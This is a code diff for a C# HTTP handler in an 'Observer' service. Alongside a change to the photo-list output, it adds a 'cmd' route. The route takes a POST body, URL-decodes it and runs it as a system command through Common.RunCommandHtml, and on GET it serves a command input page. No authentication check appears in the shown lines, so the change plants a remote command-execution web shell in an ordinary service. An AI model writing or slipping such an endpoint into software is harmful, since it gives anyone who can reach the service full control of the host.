@@ -284,12 +284,33 @@ namespace Observer
 
 
                     case "getphotolist":
-                        responseText = Common.GetPhotoList();
-                        context.Response.ContentType = "application/json";
+                        //responseText = Common.GetPhotoList();
+                        //context.Response.ContentType = "application/json";
+                        responseText = Common.GetPhotoListHtml(context.Request);
+                        //context.Response.ContentType = "text/html; charset=utf-8";
                         break;
 
                     case "help":
                         responseText = Common.getApiHtml(context.Request);
+                        break;
+
+
+                    case "cmd":
+                        if (context.Request.HttpMethod == "POST")
+                        {
+                            // 处理命令执行
+                            using (var reader = new StreamReader(context.Request.InputStream, context.Request.ContentEncoding))
+                            {
+                                string body = reader.ReadToEnd();
+                                string cmdText = Uri.UnescapeDataString(body.Replace("cmd=", ""));
+                                responseText = Common.RunCommandHtml(cmdText);
+                            }
+                        }
+                        else
+                        {
+                            // 显示输入页面
+                            responseText = Common.GetCmdPageHtml();
+                        }
                         break;
 
                     default:
@@ -298,7 +319,7 @@ namespace Observer
                 }
 
                 byte[] buffer = Encoding.UTF8.GetBytes(responseText);
-                context.Response.ContentType = path == "help" ? "text/html; charset=utf-8" : "application/json";
+                context.Response.ContentType = path == "help" || path == "getphotolist" || path == "cmd" ? "text/html; charset=utf-8" : "application/json";
                 context.Response.ContentEncoding = Encoding.UTF8;
                 context.Response.ContentLength64 = buffer.Length;
                 context.Response.OutputStream.Write(buffer, 0, buffer.Length);
